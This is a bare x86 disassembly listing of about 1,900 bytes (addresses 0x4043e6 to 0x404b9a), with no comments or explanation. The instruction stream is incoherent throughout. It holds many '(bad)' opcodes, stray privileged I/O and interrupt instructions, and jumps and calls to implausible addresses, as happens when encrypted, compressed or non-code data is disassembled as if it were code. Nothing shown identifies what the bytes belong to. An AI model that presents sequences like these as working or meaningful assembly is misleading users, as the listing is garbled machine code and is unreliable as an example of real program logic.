  4043e6:	rcr    BYTE PTR [ebp+0x425ef3a0],0x46
  4043ed:	add    edi,DWORD PTR [eax-0x58]
  4043f0:	push   edi
  4043f1:	dec    ebp
  4043f2:	mov    eax,ds:0x7284a5f3
  4043f7:	mov    ah,0x19
  4043f9:	fs loopne 0x404457
  4043fc:	sub    DWORD PTR [ecx+0x22c3a4a2],esi
  404402:	fidivr WORD PTR [edx+ebp*1+0xd5a82af]
  404409:	adc    edi,eax
  40440b:	repnz repz dec edi
  40440e:	ins    BYTE PTR es:[edi],dx
  40440f:	mov    ebp,esp
  404411:	jp     0x4043d5
  404413:	iret   
  404414:	loope  0x4043ab
  404416:	lods   eax,DWORD PTR ds:[esi]
  404417:	add    BYTE PTR [edi],ah
  404419:	(bad)  
  40441a:	mov    bl,0x87
  40441c:	mov    ah,0x8f
  40441e:	retf   0x11bf
  404421:	push   eax
  404422:	call   0x9d3ae90c
  404427:	push   esp
  404428:	adc    eax,0x735e1a07
  40442d:	(bad)  
  40442e:	and    DWORD PTR [edx+0x2201ab8e],esp
  404434:	(bad)  
  404435:	push   ebx
  404436:	mov    ds:0xf3e3973b,al
  40443b:	jge    0x404430
  40443d:	cs (bad) 
  404440:	push   0xffb73ff6
  404445:	jg     0x40441a
  404447:	es ret 
  404449:	loopne 0x404411
  40444b:	out    0x7f,eax
  40444d:	test   al,0x88
  40444f:	mov    ecx,0xa4432e7d
  404454:	daa    
  404455:	fcompp 
  404457:	int    0x15
  404459:	sar    BYTE PTR [esi+0x39],1
  40445c:	push   0x1d6bf585
  404461:	or     eax,0xd53df473
  404466:	add    al,0x66
  404468:	jns    0x4044e4
  40446a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40446b:	rol    ah,cl
  40446d:	cs int 0x58
  404470:	(bad)  
  404471:	popa   
  404472:	mov    esi,0x4678765b
  404477:	pop    ebx
  404478:	lods   al,BYTE PTR ds:[esi]
  404479:	data16 and BYTE PTR [edi-0x4f],bh
  40447d:	and    ebx,DWORD PTR [edx]
  40447f:	sub    eax,0x10a1bab3
  404484:	retf   0x8929
  404487:	jae    0x40449c
  404489:	clc    
  40448a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40448b:	sub    DWORD PTR [esi-0x231ad4a1],esp
  404491:	(bad)  
  404492:	jb     0x404437
  404494:	sbb    ebx,eax
  404496:	pusha  
  404497:	pop    ds
  404498:	cwde   
  404499:	icebp  
  40449a:	pushf  
  40449b:	sub    ecx,DWORD PTR [ebp+0x17183781]
  4044a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044a2:	or     cl,BYTE PTR [ecx+0x3b]
  4044a5:	adc    esi,DWORD PTR [esi+0x67]
  4044a8:	pop    edi
  4044a9:	jmp    0x3bdbad17
  4044ae:	sub    al,0x2
  4044b0:	cmp    DWORD PTR [eax-0x190c71f],ecx
  4044b6:	fs cwde 
  4044b8:	das    
  4044b9:	add    ebp,0xffffffbb
  4044bc:	dec    esi
  4044bd:	xchg   ebx,eax
  4044be:	push   ebx
  4044bf:	retf   
  4044c0:	mov    bl,0xdc
  4044c2:	in     al,dx
  4044c3:	popa   
  4044c4:	jo     0x4044fb
  4044c6:	sub    ch,BYTE PTR [ecx+0x500ef968]
  4044cc:	repz xor BYTE PTR [edx],cl
  4044cf:	loop   0x404461
  4044d1:	inc    ecx
  4044d2:	das    
  4044d3:	fcmovne st,st(6)
  4044d5:	ins    DWORD PTR es:[edi],dx
  4044d6:	sbb    BYTE PTR [edx+0x10],bh
  4044d9:	push   es
  4044da:	outs   dx,DWORD PTR ds:[esi]
  4044db:	sub    al,0xc4
  4044dd:	push   es
  4044de:	dec    ebp
  4044df:	xor    BYTE PTR [edx+0x6d],bh
  4044e2:	cdq    
  4044e3:	outs   dx,BYTE PTR ds:[esi]
  4044e4:	mul    BYTE PTR [ebx-0x74]
  4044e7:	fisub  WORD PTR [eax]
  4044e9:	sub    al,0x1c
  4044eb:	addr16 leave 
  4044ed:	daa    
  4044ee:	sbb    al,0x68
  4044f0:	jns    0x404497
  4044f2:	dec    ebp
  4044f3:	aaa    
  4044f4:	add    edx,DWORD PTR [esi-0x259d17f8]
  4044fa:	dec    edi
  4044fb:	sbb    eax,DWORD PTR [edx]
  4044fd:	mov    ebx,DWORD PTR [edi]
  4044ff:	addr16 and dh,BYTE PTR [bx]
  404503:	adc    cl,BYTE PTR [esi-0x724f1f5c]
  404509:	aad    0x65
  40450b:	adc    DWORD PTR [edi],0xb
  40450e:	std    
  40450f:	mov    edi,DWORD PTR [ebx]
  404511:	repz pop edx
  404513:	sahf   
  404514:	dec    esp
  404515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404516:	push   0x487cba1d
  40451b:	cmp    ecx,DWORD PTR [eax]
  40451d:	ja     0x4044f5
  40451f:	cdq    
  404520:	ins    DWORD PTR es:[edi],dx
  404521:	jge    0x4044b4
  404523:	mov    eax,ds:0x899c46ee
  404528:	daa    
  404529:	dec    ebp
  40452a:	mov    dh,BYTE PTR [edx]
  40452c:	sbb    al,0x84
  40452e:	dec    eax
  40452f:	xchg   esi,eax
  404530:	aad    0xcd
  404532:	mov    ds:0x4a67adb,al
  404537:	sub    bh,BYTE PTR [edx-0x6f104168]
  40453d:	fsubr  DWORD PTR [edx-0x496502e1]
  404543:	pop    esp
  404544:	out    dx,eax
  404545:	inc    esp
  404546:	inc    ebx
  404547:	jmp    0x404506
  404549:	sbb    al,0xc4
  40454b:	push   esp
  40454c:	jecxz  0x4044d7
  40454e:	or     edx,0xdfccdc8a
  404554:	test   BYTE PTR [ecx],ch
  404556:	mov    al,0x4e
  404558:	stc    
  404559:	or     al,0x59
  40455b:	cmp    DWORD PTR [ecx+0x2d],eax
  40455e:	inc    ecx
  40455f:	mov    bl,0x57
  404561:	xor    DWORD PTR [ebx-0x1b402dc5],esi
  404567:	repnz es xor eax,0x6f47b8c4
  40456e:	cmp    DWORD PTR [edi-0x3d80d21f],ebx
  404574:	pop    ds
  404575:	jg     0x4045c8
  404577:	mov    ds,WORD PTR [eax-0x1ac53d1b]
  40457d:	loope  0x4045d5
  40457f:	mov    WORD PTR [edi+0x54],ss
  404582:	(bad)  
  404584:	sti    
  404585:	ds dec eax
  404587:	mov    WORD PTR [esi],cs
  404589:	aas    
  40458a:	gs xchg edi,eax
  40458c:	and    ecx,DWORD PTR [ecx+0x7]
  40458f:	mov    cl,0xda
  404591:	movq   QWORD PTR [esi-0x71],mm5
  404595:	adc    eax,0x68dd5c59
  40459a:	inc    edi
  40459b:	js     0x40457c
  40459d:	xor    DWORD PTR [ebp-0x63],edx
  4045a0:	lock ja 0x404557
  4045a3:	or     ecx,DWORD PTR [edi+0x77]
  4045a6:	push   ss
  4045a7:	pop    ss
  4045a8:	or     eax,0x2f472028
  4045ad:	mov    dh,0x37
  4045af:	jne    0x40455c
  4045b1:	adc    DWORD PTR [edx-0x245f19fe],edi
  4045b7:	xor    DWORD PTR ds:0xe913a8d4,edi
  4045bd:	jg     0x4045f4
  4045bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045c1:	adc    ah,ch
  4045c3:	jae    0x404609
  4045c5:	in     al,dx
  4045c6:	(bad)  
  4045c7:	stc    
  4045c8:	push   ss
  4045c9:	jle    0x40455a
  4045cb:	loop   0x40457c
  4045cd:	mov    WORD PTR [ecx-0xc],ss
  4045d0:	imul   esp,DWORD PTR [ebx],0xf1cfc78f
  4045d6:	dec    esi
  4045d7:	stos   BYTE PTR es:[edi],al
  4045d8:	cmp    BYTE PTR [esi+0x416601a9],ah
  4045de:	jbe    0x404571
  4045e0:	jno    0x404608
  4045e2:	mov    ds:0x78d8583a,eax
  4045e7:	ss jns 0x404626
  4045ea:	xor    al,0x45
  4045ec:	shr    BYTE PTR [esi-0x50f6def5],1
  4045f2:	inc    esp
  4045f3:	sahf   
  4045f4:	imul   esi,DWORD PTR [edx+edi*8-0x5d],0x71
  4045f9:	test   eax,0x6e09ebff
  4045fe:	mov    bl,0xef
  404600:	pusha  
  404601:	mov    ecx,0x3d582de3
  404606:	pcmpeqb mm2,QWORD PTR [ebp+0x711ac84e]
  40460d:	(bad)  
  40460e:	sub    eax,0xa7a1c452
  404613:	das    
  404614:	xchg   ebp,eax
  404615:	call   0x9bc31a64
  40461a:	shr    BYTE PTR [eax+0x73],1
  40461d:	sbb    eax,0x1c51966e
  404622:	test   eax,0xec018f61
  404627:	push   ds
  404628:	xchg   edi,eax
  404629:	sbb    BYTE PTR [edi],cl
  40462b:	adc    al,0x10
  40462d:	fsub   DWORD PTR [edx+0x66]
  404630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404631:	xor    edi,0xffffff90
  404634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404635:	dec    eax
  404636:	adc    eax,0x53e075f0
  40463b:	mov    edi,0xb1a62807
  404640:	pop    esp
  404641:	pop    edx
  404642:	fadd   QWORD PTR [eax]
  404644:	jmp    0x4045dc
  404646:	imul   edi,DWORD PTR [edi-0x4f80a1c9],0x5054781f
  404650:	jp     0x4045d3
  404652:	dec    edx
  404653:	push   es
  404654:	fscale 
  404656:	repnz mov ch,ch
  404659:	dec    esi
  40465a:	fisttp QWORD PTR [esi]
  40465c:	(bad)  
  40465d:	xor    ecx,edx
  40465f:	add    eax,0xc7c13327
  404664:	lock jge 0x4046a6
  404667:	stc    
  404668:	or     edi,DWORD PTR [eax]
  40466a:	add    dh,BYTE PTR [edi-0x1f]
  40466d:	test   eax,0xf131ce71
  404672:	outs   dx,BYTE PTR ds:[esi]
  404673:	and    eax,0x976a2bc5
  404678:	(bad)  
  404679:	mov    ebx,0x92d90da8
  40467e:	cld    
  40467f:	js     0x4046c2
  404681:	test   al,0xa4
  404683:	push   ecx
  404684:	pop    eax
  404685:	jecxz  0x404633
  404687:	(bad)
  40468a:	out    0x43,al
  40468c:	mov    eax,ds:0xccb0c481
  404691:	scas   al,BYTE PTR es:[edi]
  404692:	sbb    BYTE PTR [ecx],bl
  404694:	xchg   ebp,eax
  404695:	sub    edx,edi
  404697:	dec    esi
  404698:	fadd   st,st(3)
  40469a:	xor    eax,0x66ac40c3
  40469f:	xchg   esp,eax
  4046a0:	imul   esp,DWORD PTR [esi],0x1
  4046a3:	jae    0x404630
  4046a5:	jp     0x4046b0
  4046a7:	sub    DWORD PTR [eax+0x409586c6],esp
  4046ad:	adc    ebp,0x67fa0b32
  4046b3:	mov    ebx,0x15a0498
  4046b8:	cmp    edx,edi
  4046ba:	lock sub eax,0x31b11ab0
  4046c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046c1:	clc    
  4046c2:	xlat   BYTE PTR ds:[ebx]
  4046c3:	imul   edx,esi,0x1c
  4046c6:	xchg   ebx,eax
  4046c7:	and    BYTE PTR [edx-0x6],cl
  4046ca:	sub    cl,BYTE PTR [edi-0x1e]
  4046cd:	jecxz  0x404719
  4046cf:	inc    ecx
  4046d0:	add    BYTE PTR [edx],al
  4046d2:	mov    bl,0x40
  4046d4:	in     eax,0x40
  4046d6:	test   eax,0x42e019a5
  4046db:	or     eax,0x27fdd019
  4046e0:	ins    DWORD PTR es:[edi],dx
  4046e1:	repz xchg ebx,eax
  4046e3:	fcomi  st,st(2)
  4046e5:	mov    eax,0x43ae5123
  4046ea:	mov    dh,0x6d
  4046ec:	sub    ch,bl
  4046ee:	dec    esp
  4046ef:	mov    ch,0x7c
  4046f1:	jecxz  0x4046cb
  4046f3:	div    BYTE PTR [esp+ecx*2]
  4046f6:	test   BYTE PTR [ecx],0x27
  4046f9:	xlat   BYTE PTR ds:[ebx]
  4046fa:	lock jl 0x4046ef
  4046fd:	push   es
  4046fe:	xchg   DWORD PTR [edx],edx
  404700:	enter  0xd76f,0x4d
  404704:	mov    bl,0xa2
  404706:	mov    BYTE PTR [edx-0x3fd664e7],0xc1
  40470d:	sbb    DWORD PTR fs:[eax-0x71f36061],eax
  404714:	inc    ebx
  404715:	ins    BYTE PTR es:[edi],dx
  404716:	frstor [ebp-0x77]
  404719:	dec    ebx
  40471a:	inc    ebp
  40471b:	mov    esi,0x52c324e7
  404720:	ds sahf 
  404722:	sar    DWORD PTR [esi-0x67],1
  404725:	rol    DWORD PTR [ecx+0x25],1
  404728:	fisttp QWORD PTR gs:[edx-0x5f]
  40472c:	and    bl,BYTE PTR [esi]
  40472e:	xchg   edi,eax
  40472f:	arpl   sp,dx
  404731:	add    eax,0x5bde6ab9
  404736:	leave  
  404737:	xor    ebp,DWORD PTR [ebp-0x3a]
  40473a:	mov    ds:0x2834818e,al
  40473f:	cli    
  404740:	das    
  404741:	mov    ch,bh
  404743:	test   BYTE PTR [eax],0x88
  404746:	enter  0xf993,0x57
  40474a:	add    DWORD PTR [eax+ecx*8-0x22],esi
  40474e:	(bad)  
  40474f:	(bad)  
  404750:	fs cld 
  404752:	jae    0x40473b
  404754:	fs dec esi
  404756:	ja     0x4046e4
  404758:	in     eax,dx
  404759:	jb     0x4046ed
  40475b:	jmp    0x404716
  40475d:	xchg   ecx,eax
  40475e:	cmp    eax,ecx
  404760:	scas   al,BYTE PTR es:[edi]
  404761:	pushf  
  404762:	xor    eax,DWORD PTR [edx+esi*8+0x54e397f7]
  404769:	scas   al,BYTE PTR es:[edi]
  40476a:	xchg   BYTE PTR [esp+edx*4+0x3c773387],dl
  404771:	(bad)  [esi]
  404773:	sub    edx,DWORD PTR [ebx-0x74d15942]
  404779:	xchg   BYTE PTR [edi-0xf],cl
  40477c:	icebp  
  40477d:	sbb    eax,0xddfd3b4d
  404782:	cmp    DWORD PTR [eax+edi*4-0x1eec5b49],esp
  404789:	jb     0x40479a
  40478b:	inc    esi
  40478c:	lahf   
  40478d:	test   eax,0x92b13f07
  404792:	iret   
  404793:	loop   0x40480f
  404795:	sbb    ch,BYTE PTR [edi]
  404797:	rcr    DWORD PTR [edi],0xef
  40479a:	jne    0x40476f
  40479c:	mov    DWORD PTR [ecx],0xbf6c7031
  4047a2:	add    dl,BYTE PTR [eax+esi*8+0x1b7f2026]
  4047a9:	in     eax,dx
  4047aa:	outs   dx,BYTE PTR ds:[esi]
  4047ab:	(bad)  
  4047ac:	mov    ebx,0x8dd285d9
  4047b1:	xlat   BYTE PTR ds:[ebx]
  4047b2:	jge    0x40474d
  4047b4:	sbb    eax,0x64246414
  4047b9:	mov    eax,ds:0xd34c170f
  4047be:	or     al,0xab
  4047c0:	inc    ecx
  4047c1:	pop    es
  4047c2:	stc    
  4047c3:	push   esp
  4047c4:	pop    ebp
  4047c5:	inc    ecx
  4047c6:	or     al,BYTE PTR [ebp+0x46a61773]
  4047cc:	(bad)  
  4047cd:	mov    al,0xbb
  4047cf:	pop    esi
  4047d0:	mov    ds:0x35c0ef56,al
  4047d5:	sbb    DWORD PTR [ecx-0x5b],ebx
  4047d8:	adc    bl,BYTE PTR [esi-0x56ae4c3e]
  4047de:	or     al,0xd5
  4047e0:	sub    eax,0x4e6ac0e
  4047e5:	mov    al,ds:0x4a885506
  4047ea:	xor    esi,DWORD PTR [edi-0x5728958d]
  4047f0:	scas   eax,DWORD PTR es:[edi]
  4047f1:	arpl   WORD PTR [eax],si
  4047f3:	lods   eax,DWORD PTR ds:[esi]
  4047f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f5:	sub    esi,DWORD PTR [ebp-0x32]
  4047f8:	inc    edi
  4047f9:	addr16 jg 0x4047fa
  4047fc:	sahf   
  4047fd:	mov    dl,0x70
  4047ff:	mov    edx,0x8a99e0ee
  404804:	(bad)  
  404805:	jae    0x40484c
  404807:	fs aaa 
  404809:	(bad)  
  40480a:	mov    ecx,0x8c244a84
  40480f:	outs   dx,BYTE PTR ds:[esi]
  404810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404811:	popf   
  404812:	xchg   BYTE PTR [ecx-0x36],al
  404815:	(bad)  
  404816:	gs jge 0x404829
  404819:	pop    ds
  40481a:	add    ebx,DWORD PTR [ecx]
  40481c:	(bad)  
  40481e:	das    
  40481f:	jg     0x404830
  404821:	scas   eax,DWORD PTR es:[edi]
  404822:	sub    eax,0xdf4c1af9
  404827:	pop    edx
  404828:	and    ebp,DWORD PTR [edi+0x7665bf01]
  40482e:	fst    DWORD PTR [eax]
  404830:	outs   dx,BYTE PTR ds:[esi]
  404831:	iret   
  404832:	inc    DWORD PTR [edi]
  404834:	sub    al,0xe9
  404836:	xor    eax,0xc97c4ca0
  40483b:	cwde   
  40483c:	mov    esp,0x38eb65c5
  404841:	add    esp,DWORD PTR [edi+ebx*4-0x72]
  404845:	xchg   esi,eax
  404846:	push   ss
  404847:	pop    es
  404848:	mov    BYTE PTR [ecx],al
  40484a:	xlat   BYTE PTR ds:[ebx]
  40484b:	jmp    0x4047e2
  40484d:	cmp    esp,0x6
  404850:	out    0xbe,al
  404852:	xlat   BYTE PTR ds:[ebx]
  404853:	sar    al,0x87
  404856:	sbb    dl,ah
  404858:	push   ebx
  404859:	shl    DWORD PTR [ebp+ecx*2-0x6e],1
  40485d:	fistp  QWORD PTR [esi+0x4f]
  404860:	xchg   edi,eax
  404861:	int    0xca
  404863:	mov    edx,eax
  404865:	loope  0x4047f3
  404867:	out    0x6e,al
  404869:	fcomp  DWORD PTR [ecx-0x7ab41f3c]
  40486f:	or     eax,0x1524df05
  404874:	push   ds
  404875:	mov    ss,WORD PTR [ecx+0x40b5f1e8]
  40487b:	xchg   ecx,eax
  40487c:	xchg   esi,eax
  40487d:	in     al,0x6a
  40487f:	psrlq  mm7,QWORD PTR [esi+edx*8-0x79af71d1]
  404887:	mov    bh,0xde
  404889:	pop    ebx
  40488a:	in     eax,0xa8
  40488c:	popf   
  40488d:	cmp    BYTE PTR [esi],bh
  40488f:	retf   
  404890:	adc    eax,0x515645f5
  404895:	mov    edx,0x3c4c30b3
  40489b:	cmp    DWORD PTR [ebx+eax*8],edx
  40489e:	lock pop ecx
  4048a0:	pop    edx
  4048a1:	lock pop esp
  4048a3:	jae    0x404917
  4048a5:	inc    esi
  4048a6:	mov    dl,0x36
  4048a8:	scas   eax,DWORD PTR es:[edi]
  4048a9:	or     al,0x25
  4048ab:	clc    
  4048ac:	loope  0x404911
  4048ae:	push   esi
  4048af:	(bad)  
  4048b0:	dec    edx
  4048b1:	nop
  4048b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b3:	xor    bl,BYTE PTR [edi+0x3548f093]
  4048b9:	push   es
  4048ba:	js     0x4048aa
  4048bc:	and    DWORD PTR [edi+0x2527c0d5],ebp
  4048c2:	inc    ebx
  4048c3:	push   edx
  4048c4:	and    eax,0xaaf2051e
  4048c9:	pop    ss
  4048ca:	sub    edi,DWORD PTR [esp+esi*8+0x6f03ce71]
  4048d1:	mov    edi,0xa074743c
  4048d6:	jge    0x4048ff
  4048d8:	sub    ebx,esp
  4048da:	xchg   esp,eax
  4048db:	adc    DWORD PTR [esi],edi
  4048dd:	js     0x4048ec
  4048df:	sub    dl,BYTE PTR [ebx-0x44]
  4048e2:	adc    esi,DWORD PTR [ebp+esi*4+0x54ff95e7]
  4048e9:	mul    DWORD PTR [esi+0x78]
  4048ec:	in     eax,0xa5
  4048ee:	out    dx,al
  4048ef:	nop
  4048f0:	ja     0x4048c3
  4048f2:	repnz arpl di,ax
  4048f5:	sbb    DWORD PTR [eax],esi
  4048f7:	push   eax
  4048f8:	mov    es:0xda969877,eax
  4048fe:	sar    BYTE PTR [ecx],1
  404900:	add    eax,0xf73d1986
  404905:	daa    
  404906:	mov    fs,WORD PTR [edi+0x53d9b982]
  40490c:	and    dh,BYTE PTR [ebp+0x26]
  40490f:	arpl   WORD PTR [ebp-0x1133a5d5],bx
  404915:	xor    ah,BYTE PTR fs:[ebx+0x4c]
  404919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40491a:	cdq    
  40491b:	push   edx
  40491c:	cmp    al,0x54
  40491e:	adc    bl,BYTE PTR [eax-0x37]
  404921:	jp     0x4048eb
  404923:	mov    eax,ds:0x92b7556a
  404928:	mov    ch,0xd1
  40492a:	or     DWORD PTR [edx+0x1e],ebp
  40492d:	cmp    BYTE PTR [ebx-0x35],dh
  404930:	dec    edx
  404931:	shl    BYTE PTR [edi+0x4cd0e0f7],cl
  404937:	pop    edi
  404938:	popa   
  404939:	out    0xb,al
  40493b:	push   ds
  40493c:	scas   eax,DWORD PTR es:[edi]
  40493d:	fimul  WORD PTR [ebx+0x3981347c]
  404943:	mov    cl,BYTE PTR [edx+0x30]
  404946:	sub    DWORD PTR [edx+edx*8],edx
  404949:	push   ebx
  40494a:	add    dh,ah
  40494c:	shl    BYTE PTR [ebx-0x65b7ff02],cl
  404952:	fs out dx,eax
  404954:	gs push ebx
  404956:	imul   esi,eax,0xde5e7b95
  40495c:	fstp   st(3)
  40495e:	adc    dh,bl
  404960:	sbb    BYTE PTR [ebp+ebx*1+0x1bc7266c],0x18
  404968:	mov    bl,0x2f
  40496a:	test   ch,dh
  40496c:	inc    esi
  40496d:	mov    dh,0x3d
  40496f:	jmp    0x404965
  404971:	xchg   ebp,eax
  404972:	retf   
  404973:	outs   dx,DWORD PTR ds:[esi]
  404974:	shr    DWORD PTR [esi+0x126d2123],1
  40497a:	imul   eax,esp,0xa02bad13
  404980:	jg     0x404a00
  404982:	pop    esp
  404983:	aas    
  404984:	shl    cl,0x1a
  404987:	lock inc ecx
  404989:	fisub  WORD PTR [ebx-0x5c]
  40498c:	jae    0x40492e
  40498e:	in     al,dx
  40498f:	xchg   esp,eax
  404990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404991:	nop
  404992:	(bad)  
  404993:	int    0x35
  404995:	loop   0x4049b2
  404997:	mov    fs,WORD PTR [esi+0x2b]
  40499a:	lock dec ebp
  40499c:	mov    ds:0xb1e65d99,eax
  4049a1:	or     DWORD PTR [ebx-0x51],edi
  4049a4:	dec    edi
  4049a5:	pop    ss
  4049a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049a7:	push   cs
  4049a8:	hlt    
  4049a9:	xlat   BYTE PTR ds:[ebx]
  4049aa:	div    DWORD PTR [edi+esi*1-0x3d]
  4049ae:	mov    BYTE PTR [ecx],cl
  4049b0:	mov    al,ds:0x34084921
  4049b5:	inc    edi
  4049b6:	mov    BYTE PTR [edx+0x3c5ebcb5],al
  4049bc:	clc    
  4049bd:	cmp    DWORD PTR [ecx+0xdcc5146],ebp
  4049c3:	sbb    dh,BYTE PTR ds:0xf98f75a1
  4049c9:	dec    DWORD PTR cs:[edi-0x74]
  4049cd:	push   0x70
  4049cf:	xor    ecx,DWORD PTR [edi-0x6ae25e32]
  4049d5:	loope  0x404a51
  4049d7:	sub    edi,eax
  4049d9:	xor    eax,0x5c75b9bd
  4049de:	fs dec ebp
  4049e0:	dec    eax
  4049e1:	daa    
  4049e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e3:	leave  
  4049e4:	aad    0x54
  4049e6:	mov    BYTE PTR [edi-0x35],cl
  4049e9:	push   ebp
  4049ea:	test   BYTE PTR [ebp-0x7499b280],al
  4049f0:	sub    DWORD PTR [esi],eax
  4049f2:	add    bh,ch
  4049f4:	call   0x896e7e66
  4049f9:	pop    ss
  4049fa:	ss mov ebp,0x2c2ff1d4
  404a00:	mov    eax,ds:0x6edb6eb3
  404a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a06:	pushf  
  404a07:	sbb    ebp,esp
  404a09:	data16 into 
  404a0b:	sbb    al,0x43
  404a0d:	push   esi
  404a0e:	sti    
  404a0f:	add    ax,0x777b
  404a13:	sbb    eax,0xdece4dee
  404a18:	adc    bh,BYTE PTR [ecx+0x3]
  404a1b:	or     ecx,DWORD PTR [eax]
  404a1d:	mov    BYTE PTR [edx+0x2a],dl
  404a20:	(bad)  
  404a21:	cld    
  404a22:	aad    0x71
  404a24:	dec    ebp
  404a25:	xor    DWORD PTR [esi],esi
  404a27:	fdivp  st(7),st
  404a29:	mov    eax,ds:0x20fc31c7
  404a2e:	fucompp 
  404a30:	add    DWORD PTR [ebx-0x25],ebx
  404a33:	imul   esi,DWORD PTR [ebx],0x13
  404a36:	jnp    0x4049ec
  404a38:	ret    
  404a39:	mov    dh,al
  404a3b:	fnsave [esp+ebp*8-0x3e]
  404a3f:	inc    esi
  404a40:	jmp    0x3c13:0x586a35c
  404a47:	xor    ch,BYTE PTR [ebx-0x67d7dc44]
  404a4d:	sbb    eax,0x8a387ca3
  404a52:	dec    di
  404a54:	ins    BYTE PTR es:[edi],dx
  404a55:	or     DWORD PTR [ecx+0x514780af],ebp
  404a5b:	test   eax,0x1a252f72
  404a60:	jp     0x404a3f
  404a62:	pop    ebp
  404a63:	inc    edx
  404a64:	inc    ebp
  404a65:	retf   0x5c64
  404a68:	neg    al
  404a6a:	jae    0x404a8d
  404a6c:	and    ebx,ebp
  404a6e:	mov    ah,0x98
  404a70:	adc    eax,0x8675ffdb
  404a75:	cmp    esp,DWORD PTR [edx-0x27]
  404a78:	lods   eax,DWORD PTR ds:[esi]
  404a79:	je     0x404a14
  404a7b:	in     eax,0xfc
  404a7d:	push   cs
  404a7e:	and    ebx,DWORD PTR [esi-0x41485ae1]
  404a84:	les    edx,FWORD PTR [edi-0x2d4920b5]
  404a8a:	xor    dl,BYTE PTR [ecx-0x3f]
  404a8d:	jne    0x404acc
  404a8f:	stos   DWORD PTR es:[edi],eax
  404a90:	loop   0x404a29
  404a92:	inc    edx
  404a93:	imul   dh
  404a95:	xor    edi,DWORD PTR [eax-0x19adc5c6]
  404a9b:	aaa    
  404a9c:	sti    
  404a9d:	daa    
  404a9e:	inc    edi
  404a9f:	aas    
  404aa0:	fmul   DWORD PTR [edx-0x340d25f5]
  404aa6:	ret    0x489
  404aa9:	ret    0x3fcb
  404aac:	int3   
  404aad:	mov    ch,0x74
  404aaf:	not    BYTE PTR [edx-0xe]
  404ab2:	mov    edi,0x992e77ef
  404ab7:	xchg   BYTE PTR [edi+0x4c],ch
  404aba:	call   0x53e807d
  404abf:	inc    ecx
  404ac0:	aas    
  404ac1:	adc    DWORD PTR [ebp+0x4c],esp
  404ac4:	sbb    eax,0x733ef920
  404ac9:	call   0xf863f5a4
  404ace:	sbb    BYTE PTR [eax-0x1ee5825b],0x94
  404ad5:	int    0x70
  404ad7:	jecxz  0x404a5f
  404ad9:	stos   BYTE PTR es:[edi],al
  404ada:	push   ds
  404adb:	mov    al,ds:0x1ed8e4f0
  404ae0:	dec    edx
  404ae1:	inc    edi
  404ae2:	inc    edx
  404ae3:	nop
  404ae4:	fsubr  QWORD PTR [ebp+0x6a]
  404ae7:	mov    eax,ds:0x7a49b4
  404aec:	push   ebx
  404aed:	xor    bl,BYTE PTR [ebx]
  404aef:	aaa    
  404af0:	push   0x8
  404af2:	and    edi,0xffffffa0
  404af5:	sbb    edi,esp
  404af7:	dec    ebx
  404af8:	scas   al,BYTE PTR es:[edi]
  404af9:	cli    
  404afa:	outs   dx,BYTE PTR ds:[esi]
  404afb:	push   esi
  404afc:	std    
  404afd:	sbb    DWORD PTR [ebp-0x1b],ebx
  404b00:	cmovns edi,DWORD PTR [ecx]
  404b03:	fcmovnu st,st(6)
  404b05:	jmp    0xee7c:0xa784cab7
  404b0c:	dec    edi
  404b0d:	ret    0xfcc8
  404b10:	dec    ecx
  404b11:	jae    0x404ad4
  404b13:	xchg   esp,eax
  404b14:	mov    eax,ds:0x6bb7456b
  404b19:	jns    0x404ab3
  404b1b:	pop    ebp
  404b1c:	pop    esi
  404b1d:	push   ebp
  404b1e:	sti    
  404b1f:	cld    
  404b20:	push   eax
  404b21:	inc    ebp
  404b22:	cmp    DWORD PTR [edx-0x572751ad],ebp
  404b28:	inc    eax
  404b29:	pop    es
  404b2a:	rol    DWORD PTR [esi],cl
  404b2c:	int    0xcd
  404b2e:	dec    ecx
  404b2f:	in     eax,0x63
  404b31:	retf   0xc151
  404b34:	out    dx,al
  404b35:	jnp    0x404b88
  404b37:	push   edx
  404b38:	pop    ss
  404b39:	les    ebx,FWORD PTR [edx+0x433f184c]
  404b3f:	inc    edi
  404b40:	or     al,0xc2
  404b42:	or     DWORD PTR [ebx-0x72c69a2],0x79
  404b49:	sti    
  404b4a:	dec    eax
  404b4b:	aad    0x67
  404b4d:	dec    ebp
  404b4e:	ficomp DWORD PTR [esi+0x11]
  404b51:	mov    al,ds:0xa2cec0f4
  404b56:	add    ch,BYTE PTR [eax]
  404b58:	jb     0x404adf
  404b5a:	imul   eax,DWORD PTR [edx],0x55
  404b5d:	mov    cl,al
  404b5f:	sbb    DWORD PTR [ecx+0x7580dcf1],0xc10f2f8f
  404b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b6a:	inc    ebp
  404b6b:	mul    BYTE PTR [ebx+0x14]
  404b6e:	(bad)  
  404b6f:	lods   eax,DWORD PTR gs:[esi]
  404b71:	jecxz  0x404bc3
  404b73:	dec    esi
  404b74:	pop    ebp
  404b75:	jmp    0x404b6a
  404b77:	mov    ebp,0x773b702b
  404b7c:	push   eax
  404b7d:	out    0x3,al
  404b7f:	retf   
  404b80:	outs   dx,DWORD PTR ds:[esi]
  404b81:	loop   0x404b23
  404b83:	mov    BYTE PTR [esi],ch
  404b85:	jecxz  0x404ba8
  404b87:	fldcw  WORD PTR [ebx+0x65e967b4]
  404b8d:	xchg   BYTE PTR [esi+edx*2+0x21],dh
  404b91:	mov    ah,0x42
  404b93:	fbstp  TBYTE PTR [edi+ebx*8+0x3c08e628]
  404b9a:	mov    al,ds:0x3d0e9f6
